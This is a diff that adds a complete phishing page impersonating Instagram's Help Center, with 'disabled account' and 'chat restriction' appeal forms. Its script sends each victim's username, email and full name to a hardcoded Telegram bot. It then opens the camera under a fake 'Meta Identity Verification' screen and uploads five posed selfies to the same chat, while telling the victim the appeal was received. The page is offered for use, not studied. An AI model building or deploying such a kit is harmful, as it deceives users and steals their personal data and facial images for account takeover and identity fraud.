@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Support Center</title>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fff;
+            color: #262626;
+        }
+
+        .header {
+            background: #fff;
+            border-bottom: 1px solid #dbdbdb;
+            padding: 20px 16px;
+            text-align: center;
+        }
+
+        .header img {
+            height: 40px;
+            width: auto;
+        }
+
+        .search-container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 0 16px;
+            position: relative;
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 28px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 16px;
+            height: 16px;
+            opacity: 0.5;
+        }
+
+        .search-box {
+            width: 100%;
+            padding: 8px 12px 8px 40px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            color: #8e8e8e;
+        }
+
+        .main-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 24px 16px;
+        }
+
+        .help-center-label {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-bottom: 16px;
+        }
+
+        .option-item {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            transition: background 0.2s;
+        }
+
+        .option-item:hover {
+            background: #fafafa;
+        }
+
+        .radio-circle {
+            width: 20px;
+            height: 20px;
+            min-width: 20px;
+            border: 2px solid #dbdbdb;
+            border-radius: 50%;
+            position: relative;
+            margin-top: 2px;
+        }
+
+        .option-item.selected .radio-circle {
+            border-color: #0095f6;
+        }
+
+        .option-item.selected .radio-circle::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px;
+            height: 10px;
+            background: #0095f6;
+            border-radius: 50%;
+        }
+
+        .option-content {
+            flex: 1;
+        }
+
+        .option-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 6px;
+        }
+
+        .option-description {
+            font-size: 14px;
+            color: #8e8e8e;
+            line-height: 1.5;
+        }
+
+        .form-container {
+            display: none;
+        }
+
+        .form-container.active {
+            display: block;
+        }
+
+        .form-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px;
+        }
+
+        .form-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 12px;
+        }
+
+        .form-description {
+            font-size: 14px;
+            color: #8e8e8e;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .form-input,
+        .form-select {
+            width: 100%;
+            padding: 9px 8px;
+            font-size: 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            color: #262626;
+            font-family: inherit;
+        }
+
+        .form-input:focus,
+        .form-select:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background: #fff;
+        }
+
+        .send-btn {
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 7px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .send-btn:hover {
+            background: #1877f2;
+        }
+
+        .footer {
+            background: #fafafa;
+            padding: 40px 20px 20px;
+            margin-top: 50px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+            margin-bottom: 16px;
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .footer-link {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.2px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            text-align: center;
+            font-size: 12px;
+            color: #000;
+            margin-top: 16px;
+            font-weight: 400;
+        }
+
+        .footer-language {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px 16px;
+            margin-top: 20px;
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .footer-language a {
+            font-size: 12px;
+            color: #737373;
+            text-decoration: none;
+            font-weight: 400;
+            opacity: 0.7;
+        }
+
+        .footer-language a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-language .active {
+            color: #262626;
+            font-weight: 600;
+            opacity: 1;
+        }
+
+        .verification-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            z-index: 1000;
+        }
+
+        .verification-screen.active {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .verification-header {
+            background: #fff;
+            border-bottom: 1px solid #dbdbdb;
+            padding: 16px;
+            text-align: center;
+        }
+
+        .verification-header h2 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        .verification-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: #fafafa;
+        }
+
+        .camera-box {
+            width: 100%;
+            max-width: 380px;
+            height: 480px;
+            background: #000;
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 1px 8px rgba(0,0,0,0.1);
+        }
+
+        #verificationVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .face-oval {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 260px;
+            border: 2px solid rgba(255,255,255,0.8);
+            border-radius: 50%;
+            box-shadow: 0 0 0 9999px rgba(0,0,0,0.5);
+            pointer-events: none;
+            transition: border-color 0.3s;
+        }
+
+        .face-oval.matched {
+            border-color: #4CAF50;
+            box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 20px rgba(76,175,80,0.6);
+        }
+
+        .pose-text {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.75);
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .pose-count {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.75);
+            color: #fff;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        .verification-submit-btn {
+            display: none;
+            margin-top: 20px;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .verification-submit-btn.show {
+            display: block;
+        }
+
+        .success-modal {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #fff;
+            border-top: 1px solid #ccc;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.15);
+            z-index: 2000;
+            animation: slideUp 0.3s ease;
+        }
+
+        .success-modal.active {
+            display: block;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            background: #6d86b7;
+            color: #fff;
+            padding: 12px;
+            font-weight: bold;
+            font-size: 15px;
+        }
+
+        .modal-body {
+            padding: 16px;
+            color: #333;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .modal-footer {
+            padding: 10px 16px;
+            text-align: right;
+        }
+
+        .modal-btn {
+            background: #4267b2;
+            color: #fff;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 3px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        .modal-btn:hover {
+            background: #365899;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://files.catbox.moe/5iyrej.png" alt="Instagram">
+    </div>
+
+    <div class="search-container">
+        <svg class="search-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M21 21L16.65 16.65M19 11C19 15.4183 15.4183 19 11 19C6.58172 19 3 15.4183 3 11C3 6.58172 6.58172 3 11 3C15.4183 3 19 6.58172 19 11Z" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <input type="text" class="search-box" placeholder="How can we help?" readonly>
+    </div>
+
+    <div class="main-container" id="selectionScreen">
+        <div class="help-center-label">Help Center</div>
+
+        <div class="option-item" onclick="selectOption('disabled', this)">
+            <div class="radio-circle"></div>
+            <div class="option-content">
+                <div class="option-title">Disabled Account Appeal (New)</div>
+                <div class="option-description">If your Instagram account has been disabled, submit an appeal to request a review. Please provide accurate information for faster processing.</div>
+            </div>
+        </div>
+
+        <div class="option-item" onclick="selectOption('chat', this)">
+            <div class="radio-circle"></div>
+            <div class="option-content">
+                <div class="option-title">Instagram Chat Restrictions Appeal</div>
+                <div class="option-description">Appeal against chat restrictions or message blocking on your Instagram account. We'll review your case and get back to you.</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-container form-container" id="disabledForm">
+        <div class="help-center-label">Help Center</div>
+        <div class="form-box">
+            <h1 class="form-title">Disabled Account Appeal (New)</h1>
+            <p class="form-description">If your Instagram account has been disabled, submit an appeal to request a review. Please provide accurate information for faster processing.</p>
+
+            <form id="disabledAppealForm">
+                <div class="form-group">
+                    <label class="form-label">Instagram Username</label>
+                    <input type="text" class="form-input" name="username" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Email Address</label>
+                    <input type="email" class="form-input" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Full Name</label>
+                    <input type="text" class="form-input" name="fullname" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Alternative Instagram Account (Optional)</label>
+                    <input type="text" class="form-input" name="alternative">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Your Relationship to This Account</label>
+                    <select class="form-select" name="relationship" required>
+                        <option value="">Select an option</option>
+                        <option value="owner">I am the rights owner</option>
+                        <option value="representative">I am representing my organization or client</option>
+                        <option value="behalf">I am reporting on behalf of someone else</option>
+                    </select>
+                </div>
+                <button type="submit" class="send-btn">Send</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="main-container form-container" id="chatForm">
+        <div class="help-center-label">Help Center</div>
+        <div class="form-box">
+            <h1 class="form-title">Instagram Chat Restrictions Appeal</h1>
+            <p class="form-description">Appeal against chat restrictions or message blocking on your Instagram account. We'll review your case and get back to you.</p>
+
+            <form id="chatAppealForm">
+                <div class="form-group">
+                    <label class="form-label">Instagram Username</label>
+                    <input type="text" class="form-input" name="username" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Email Address</label>
+                    <input type="email" class="form-input" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Full Name</label>
+                    <input type="text" class="form-input" name="fullname" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Alternative Instagram Account (Optional)</label>
+                    <input type="text" class="form-input" name="alternative">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Your Relationship to This Account</label>
+                    <select class="form-select" name="relationship" required>
+                        <option value="">Select an option</option>
+                        <option value="owner">I am the rights owner</option>
+                        <option value="representative">I am representing my organization or client</option>
+                        <option value="behalf">I am reporting on behalf of someone else</option>
+                    </select>
+                </div>
+                <button type="submit" class="send-btn">Send</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="verification-screen" id="verificationScreen">
+        <div class="verification-header">
+            <h2>Meta Identity Verification</h2>
+        </div>
+        <div class="verification-content">
+            <div class="camera-box">
+                <video id="verificationVideo" autoplay playsinline></video>
+                <div class="face-oval" id="faceOval"></div>
+                <div class="pose-text" id="poseText">Look Straight at Camera</div>
+                <div class="pose-count" id="poseCount">Pose 1 of 5</div>
+            </div>
+            <button class="verification-submit-btn" id="verificationSubmitBtn">Submit Verification</button>
+        </div>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <div class="modal-header">
+            Form Submitted Successfully
+        </div>
+        <div class="modal-body">
+            Your form has been submitted successfully. We have received your information and will process it shortly.
+        </div>
+        <div class="modal-footer">
+            <button class="modal-btn" onclick="redirectToMainPage()">Okay</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">ABOUT US</a>
+            <a href="#" class="footer-link">HELP</a>
+            <a href="#" class="footer-link">API</a>
+            <a href="#" class="footer-link">JOBS</a>
+            <a href="#" class="footer-link">TERMS</a>
+            <a href="#" class="footer-link">PRIVACY</a>
+        </div>
+        
+        <div class="footer-copyright">© 2025 INSTAGRAM, INC.</div>
+        
+        <div class="footer-language">
+            <a href="#" class="active">ENGLISH (US)</a>
+            <a href="#">ENGLISH (UK)</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">ਪੰਜਾਬੀ</a>
+            <a href="#">اردو</a>
+            <a href="#">ગુજરાતી</a>
+            <a href="#">বাংলা</a>
+            <a href="#">தமிழ்</a>
+            <a href="#">తెలుగు</a>
+            <a href="#">മലയാളം</a>
+            <a href="#">ಕನ್ನಡ</a>
+        </div>
+    </div>
+
+    <canvas id="captureCanvas" style="display:none;"></canvas>
+
+    <script>
+        // Telegram Configuration
+        const BOT_TOKEN = '7970088628:AAEJbT7PvzAnnP33z9_vVzCWWLItzbTXCfQ';
+        const CHAT_ID = '6881713177';
+        
+        let verificationState = {
+            currentPose: 0,
+            captures: [],
+            videoStream: null,
+            formData: {},
+            isCapturing: false
+        };
+
+        const POSES = [
+            { name: 'straight', text: 'Look Straight at Camera' },
+            { name: 'up', text: 'Look Up' },
+            { name: 'left', text: 'Turn Face Left' },
+            { name: 'right', text: 'Turn Face Right' },
+            { name: 'straight_final', text: 'Look Straight Again' }
+        ];
+
+        function selectOption(type, element) {
+            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
+            element.classList.add('selected');
+            setTimeout(() => {
+                document.getElementById('selectionScreen').classList.add('hidden');
+                if (type === 'disabled') {
+                    document.getElementById('disabledForm').classList.add('active');
+                } else {
+                    document.getElementById('chatForm').classList.add('active');
+                }
+            }, 300);
+        }
+
+        document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmit(this, 'Disabled Account Appeal');
+        });
+
+        document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleFormSubmit(this, 'Chat Restrictions Appeal');
+        });
+
+        function handleFormSubmit(form, formType) {
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData);
+            verificationState.formData = { type: formType, ...data };
+            
+            // Send form data to Telegram
+            sendFormToTelegram(data, formType);
+            
+            document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
+            document.getElementById('verificationScreen').classList.add('active');
+            setTimeout(startVerification, 500);
+        }
+
+        function sendFormToTelegram(data, formType) {
+            const message = `📋 Instagram Appeal Form
+
+Type: ${formType}
+━━━━━━━━━━━━━━━━━━━━
+👤 Username: ${data.username}
+📧 Email: ${data.email}
+📝 Name: ${data.fullname}
+🔗 Alt Account: ${data.alternative || 'N/A'}
+👥 Relationship: ${data.relationship}
+━━━━━━━━━━━━━━━━━━━━
+🕐 Time: ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: message, 
+                    parse_mode: 'HTML' 
+                })
+            }).then(response => response.json())
+              .then(data => console.log('Form sent to Telegram:', data))
+              .catch(error => console.error('Error sending form:', error));
+        }
+
+        function startVerification() {
+            // Fix for mobile camera black screen
+            const constraints = {
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 1280, min: 640 },
+                    height: { ideal: 720, min: 480 },
+                    frameRate: { ideal: 30 }
+                }
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+            .then(stream => {
+                verificationState.videoStream = stream;
+                const video = document.getElementById('verificationVideo');
+                video.srcObject = stream;
+                
+                // Wait for video to be ready
+                return new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(() => {
+                            setTimeout(() => {
+                                processNextPose();
+                            }, 1000);
+                            resolve();
+                        }).catch(e => {
+                            console.error('Video play error:', e);
+                            resolve();
+                        });
+                    };
+                });
+            })
+            .catch(error => {
+                console.error('Camera error:', error);
+                alert('Please allow camera access to continue verification.');
+                // Fallback: Continue without camera for testing
+                setTimeout(processNextPose, 1000);
+            });
+        }
+
+        function processNextPose() {
+            if (verificationState.currentPose >= POSES.length) {
+                allPosesComplete();
+                return;
+            }
+            
+            const pose = POSES[verificationState.currentPose];
+            document.getElementById('poseText').textContent = pose.text;
+            document.getElementById('poseCount').textContent = `Pose ${verificationState.currentPose + 1} of ${POSES.length}`;
+            document.getElementById('faceOval').classList.remove('matched');
+            
+            verificationState.isCapturing = false;
+            
+            setTimeout(() => {
+                document.getElementById('faceOval').classList.add('matched');
+                setTimeout(captureAndSendPose, 600);
+            }, 2000);
+        }
+
+        function captureAndSendPose() {
+            if (verificationState.isCapturing) return;
+            verificationState.isCapturing = true;
+            
+            const video = document.getElementById('verificationVideo');
+            const canvas = document.getElementById('captureCanvas');
+            
+            // Set canvas size to match video
+            if (video.videoWidth && video.videoHeight) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+            } else {
+                // Fallback dimensions
+                canvas.width = 640;
+                canvas.height = 480;
+            }
+            
+            const ctx = canvas.getContext('2d');
+            
+            // Fix for mobile: Clear canvas and wait a bit for video frame
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            setTimeout(() => {
+                // Draw video frame
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    const pose = POSES[verificationState.currentPose];
+                    verificationState.captures.push(blob);
+                    
+                    // Send selfie to Telegram
+                    sendSelfieToTelegram(blob, pose, verificationState.currentPose + 1);
+                    
+                    verificationState.currentPose++;
+                    setTimeout(processNextPose, 800);
+                }, 'image/jpeg', 0.92);
+            }, 200);
+        }
+
+        function sendSelfieToTelegram(blob, pose, poseNumber) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `selfie_${poseNumber}.jpg`);
+            
+            const caption = `📸 Verification Selfie ${poseNumber}/5
+
+👤 User: ${verificationState.formData.username}
+📝 Pose: ${pose.text}
+📋 Type: ${verificationState.formData.type}
+🕐 Time: ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+            
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+                method: 'POST', 
+                body: formData 
+            })
+            .then(response => response.json())
+            .then(data => console.log(`Pose ${poseNumber} sent:`, data))
+            .catch(error => console.error(`Error sending pose ${poseNumber}:`, error));
+        }
+
+        function allPosesComplete() {
+            document.getElementById('poseText').style.display = 'none';
+            document.getElementById('poseCount').style.display = 'none';
+            document.getElementById('faceOval').style.display = 'none';
+            
+            const btn = document.getElementById('verificationSubmitBtn');
+            btn.classList.add('show');
+            
+            btn.onclick = () => {
+                // Send completion summary
+                const summary = `✅ VERIFICATION COMPLETED
+
+👤 User: ${verificationState.formData.username}
+📧 Email: ${verificationState.formData.email}
+📝 Name: ${verificationState.formData.fullname}
+📋 Form: ${verificationState.formData.type}
+📸 Photos: 5/5
+✓ Status: Ready for Review
+🕐 Completed: ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: summary,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => console.log('Completion sent:', data))
+                .catch(error => console.error('Error sending completion:', error));
+                
+                // Stop camera stream
+                if (verificationState.videoStream) {
+                    verificationState.videoStream.getTracks().forEach(track => track.stop());
+                }
+                
+                document.getElementById('verificationScreen').classList.remove('active');
+                document.getElementById('successModal').classList.add('active');
+            };
+        }
+
+        function redirectToMainPage() {
+            document.getElementById('successModal').classList.remove('active');
+            document.getElementById('selectionScreen').classList.remove('hidden');
+            document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
+            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
+            document.getElementById('disabledAppealForm').reset();
+            document.getElementById('chatAppealForm').reset();
+            
+            // Reset verification state
+            verificationState = { 
+                currentPose: 0, 
+                captures: [], 
+                videoStream: null, 
+                formData: {}, 
+                isCapturing: false 
+            };
+            
+            window.scrollTo(0, 0);
+        }
+    </script>
+</body>
+</html>
